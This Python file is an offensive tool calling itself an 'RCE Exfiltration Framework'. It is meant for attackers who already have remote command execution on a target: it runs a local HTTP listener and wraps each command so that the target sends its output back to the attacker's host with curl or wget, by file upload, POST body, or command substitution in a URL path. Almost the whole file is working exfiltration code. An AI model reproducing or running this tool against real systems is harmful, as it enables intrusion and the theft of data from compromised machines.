import argparse
import importlib
import logging
import os
import queue
import sys
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Tuple
import threading
from multiprocessing import Process

global responses
methods = ['CURL', 'CURL-2', 'WGET_FILE', 'WGET']


def rce_function(cmd):
    logging.info('doing some action to run command:{0}'.format(cmd))
    return True


def main():
    global responses
    arg_parser = init_argument_parse()
    args = arg_parser.parse_args()
    config_logger(args.verbose)
    print(args)
    print_banner()
    m = importlib.import_module(args.rce)
    rce_func = getattr(m, 'my_rce_function')
    exfiltrator = Exfiltrator(lhost=args.lhost, rce_func=rce_func, shost=args.shost, lport=args.lport,
                              tmp_file=args.file,
                              method=args.method)
    exfiltrator.start_server()
    while True:
        cmd = input("#")
        exfiltrator.do_rce(cmd)
        output_thread = Process(target=handle_output)
        output_thread.start()
        t = 0
        while output_thread.is_alive():
            if t >= args.timeout:
                output_thread.terminate()
                logging.warning('Response timeout exceeded...')
                print('Timeout')
            time.sleep(args.timeout / 10)
            t = t + args.timeout / 10


def init_argument_parse():
    arg_parser = argparse.ArgumentParser(description="found RCE but can't spawn a shell? Exfiltrate!")
    listener_group = arg_parser.add_argument_group('Listener')
    listener_group.add_argument('--shost', '-s', metavar='SERVER_HOST', dest='shost', default='0.0.0.0')
    listener_group.add_argument('--lport', '-p', metavar='LOCAL_PORT', dest='lport', type=int, default=8000)
    listener_group.add_argument('--lhost', '-l', metavar='LOCAL_HOST', dest='lhost', required=True)
    listener_group.add_argument('--file', '-f', metavar='TMP_REMOTE_FILE', dest='file', default='/tmp/o')
    arg_parser.add_argument('--method', '-m', metavar=''.join([m + ' ' for m in methods]), dest='method',
                            default=methods[0])
    arg_parser.add_argument('--timeout', '-t', metavar='TIME_WAIT', dest='timeout', type=float, default=30)
    arg_parser.add_argument('--verbose', '-v', metavar='LEVEL', dest='verbose', type=int, default=0)
    arg_parser.add_argument('--rce-module', metavar='MODULE', dest='rce', required=True)
    return arg_parser


def handle_output():
    print('{0}'.format(get_last_response()))


def get_last_response():
    global responses
    return responses.get()


class Exfiltrator:

    def __init__(self, rce_func, shost, lhost, lport, tmp_file, method):
        global responses
        responses = queue.LifoQueue()
        self._method = method
        self._method_file = tmp_file
        self._host = lhost
        self.rce_func = rce_func
        self._port = lport
        self._server = Server((shost, self._port), Handler)
        logging.info('Starting httpd handler on port:{0}...'.format(self._port))

    def do_rce(self, cmd):
        self.rce_func(self._gen_shell_code(cmd))

    def _gen_shell_code(self, cmd):
        if self._method == methods[0]:
            return '{0}>{1};curl --data-binary @{1} {2}'.format(
                cmd, self._method_file, self._get_host_string())
        if self._method == methods[1]:
            return '{0}>{1};curl -F "file=@{1};filename=e" {2}'.format(
                cmd, self._method_file, self._get_host_string())

        if self._method == methods[2]:
            return '{0} > {1} && wget --header="Content-type: multipart/form-data boundary=FILEUPLOAD" --post-file {1} http://{2}'.format(
                cmd, self._method_file, self._get_host_string())
        elif self._method == methods[3]:
            return "wget {0}:{1}/$({2})".format(self._host, self._port, cmd)

    def _get_host_string(self):
        return "{0}:{1}".format(self._host, self._port)

    def start_server(self):
        self._server.start()

    def __del__(self):
        if getattr(self, '_server', None):
            logging.info('killing httpd handler on port:{0}...'.format(self._port))
            self._server.server_close()


def ascii(s):
    return ''.join(['\\x' + str(ord(character)) for character in s])


class Server(HTTPServer):

    def __init__(self, server_address: Tuple[str, int], handler):
        super().__init__(server_address, handler)
        self._thread = threading.Thread(target=self.serve_forever)

    def start(self):
        self._thread.start()


class Handler(BaseHTTPRequestHandler):

    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        global responses
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        responses.put(self.path[1:])
        self._set_response()
        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

    def do_POST(self):
        global responses
        content_length = int(self.headers['Content-Length'])  # <--- Gets the size of data
        post_data = self.rfile.read(content_length)  # <--- Gets the data itself
        self._set_response()
        responses.put(post_data.decode('utf-8'))


def run(host, port, handler_class=Handler, server_class=HTTPServer):
    server_address = (host, port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')


def config_logger(level):
    logger = logging.getLogger()
    if level < 1:
        logger.disabled = True
    elif level < 2:
        logger.setLevel(logging.CRITICAL)
    elif level < 3:
        logger.setLevel(logging.ERROR)
    elif level < 4:
        logger.setLevel(logging.WARNING)
    elif level < 5:
        logger.setLevel(logging.INFO)
    elif level < 6:
        logger.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(asctime)s %(levelname)s: %(message)s')
    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(formatter)
    logger.addHandler(sh)


def print_banner():
    print('------------------------------------')
    print('RCE Exfiltration Framework v0.1a /o/')
    print('------------------------------------')


if __name__ == '__main__':
    main()
